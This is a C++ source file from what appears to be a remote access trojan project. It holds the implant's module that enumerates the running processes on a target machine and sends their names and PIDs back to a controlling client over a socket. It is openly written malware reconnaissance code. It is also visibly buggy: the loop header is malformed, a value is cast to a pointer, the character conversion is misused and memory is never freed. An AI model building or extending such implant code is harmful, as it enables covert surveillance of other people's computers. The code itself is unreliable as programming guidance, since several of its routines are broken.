// Patrick Sacchet (@pjsacchet)
// Verison 1.0.
// RAT-Dll-Process.cpp : Defines functionality for performing a process on target, i.e., capture information about a current running process or list all processes running

#include "RAT-Dll-Process.h"
#include "RAT-Dll-Connect.h"
#include <psapi.h>


/** Handle socket work and function calls for performing process listing functionality
* clientSock - current open client socket to implant
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT handleProcessList(SOCKET clientSock)
{
	 INT status = SUCCESS, numProcesses = 0;
	 CHAR msgBuf[DEFAULT_BUF_LEN];
	 CHAR** processNames = NULL;
	 DWORD* processPIDs = NULL;

	 // Grab a list of process names and their PIDs
	 status = doProcessList(&processNames, &processPIDs, &numProcesses);
	 if (status != SUCCESS)
	 {
		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure received from handleScreenshot %d\n", status);
		 OutputDebugStringA(msgBuf);
		 goto cleanup;
	 }

	 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Sending %d processes\n", numProcesses);
	 OutputDebugStringA(msgBuf);
	  
	 // Send back the number of processes we found first 
	 status = send(clientSock, (const char*)&numProcesses, sizeof(INT), 0);
	 if (status == SOCKET_ERROR)
	 {
		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure recevied from send (num of processes) %d\n", WSAGetLastError());
		 OutputDebugStringA(msgBuf);
		 status = WSAGetLastError();
		 goto cleanup;
	 }

	 // Iterate through each list, send the process name and the PID
	 for (int i = 0; i++; i < numProcesses)
	 {
		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Sending process %s\n", processNames[i]);
		 OutputDebugStringA(msgBuf);

		 status = send(clientSock, processNames[i], sizeof(processNames[i]), 0);
		 if (status == SOCKET_ERROR)
		 {
			 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure recevied from send (process name number %d) %d\n", i, WSAGetLastError());
			 OutputDebugStringA(msgBuf);
			 status = WSAGetLastError();
			 goto cleanup;
		 }

		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Sending PID %d\n", processPIDs[i]);
		 OutputDebugStringA(msgBuf);

		 status = send(clientSock, (const char*)processPIDs[i], sizeof(DWORD), 0);
		 if (status == SOCKET_ERROR)
		 {
			 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure recevied from send (process pid number %d) %d\n", i, WSAGetLastError());
			 OutputDebugStringA(msgBuf);
			 status = WSAGetLastError();
			 goto cleanup;
		 }
	 }

	 OutputDebugStringA("RAT-Dll-Process::handleProcessList - Successfully sent all processes !\n");

	 // Send success reponse code 
	 status = sendSuccess(clientSock);
	 if (status != SUCCESS)
	 {
		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure recevied from sendSuccess %d\n", WSAGetLastError());
		 OutputDebugStringA(msgBuf);
		 goto cleanup;
	 }


 cleanup:
	 // TODO: clean memory pls
	return status;
}


INT doProcessList(__out CHAR*** processNames, __out DWORD** processPIDs, __out INT* numProcesses)
{
	INT status = SUCCESS;
	DWORD aProcesses [1024], cbNeeded = 0, cProcesses = 0;
	CHAR msgBuf[DEFAULT_BUF_LEN];
	CHAR szProcessName[MAX_PATH];
	UINT64 i;

	// Return value should be non-zero
	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Failure received from EnumProcesses %d\n", GetLastError());
		OutputDebugStringA(msgBuf);
		status = FAILURE;
		goto cleanup;
	}

	// TODO: Could call EnumProcessModulesEx for module information...
	cProcesses = cbNeeded / sizeof(DWORD);

	*numProcesses = cProcesses;

	sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Found %d processes\n", cProcesses);
	OutputDebugStringA(msgBuf);

	// Get each process name and ID
	*processNames = (CHAR**)malloc(cProcesses * sizeof(CHAR*));
	if (*processNames == NULL)
	{
		OutputDebugStringA("RAT-Dll-Process::doProcessList - Failed to allocate enough memory!\n");
		status = FAILURE;
		goto cleanup;
	}

	*processPIDs = (DWORD*)malloc(cProcesses * sizeof(DWORD));
	if (*processPIDs == NULL)
	{
		OutputDebugStringA("RAT-Dll-Process::doProcessList - Failed to allocate enough memory!\n");
		status = FAILURE;
		goto cleanup;
	}

	for (i = 0; i < cProcesses; i++)
	{
		if (aProcesses[i] != 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);

			if (hProcess != NULL)
			{
				HMODULE hMod;
				DWORD cbNeeded;

				// Get process name
				if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
				{
					GetModuleBaseNameA(hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(CHAR));

					sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Process %s with PID %d\n", szProcessName, aProcesses[i]);
					OutputDebugStringA(msgBuf);

					// Copy over this base name
					**processNames = (CHAR*)malloc(sizeof(char) * sizeof(szProcessName) / sizeof(CHAR));
					if (**processNames == NULL)
					{
						OutputDebugStringA("RAT-Dll-Process::doProcessList - Failed to allocate enough memory!\n");
						status = FAILURE;
						goto cleanup;
					}

					if (!wctomb(**processNames, *szProcessName))
					{
						sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Failure received from wctomb %d\n", status);
						OutputDebugStringA(msgBuf);
						status = FAILURE;
						goto cleanup;
					}

					// We already have the PID so copy that as well
					if (!memcpy(*processPIDs, &aProcesses[i], sizeof(DWORD)))
					{
						sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Failure received from memcpy %d\n", status);
						OutputDebugStringA(msgBuf);
						status = FAILURE;
						goto cleanup;
					}

					// Increment pointers to get to next address space 
					(**processNames)++;
					(*processPIDs)++;
				}

				CloseHandle(hProcess);
			}
		}
	}



cleanup: 
	return status;
}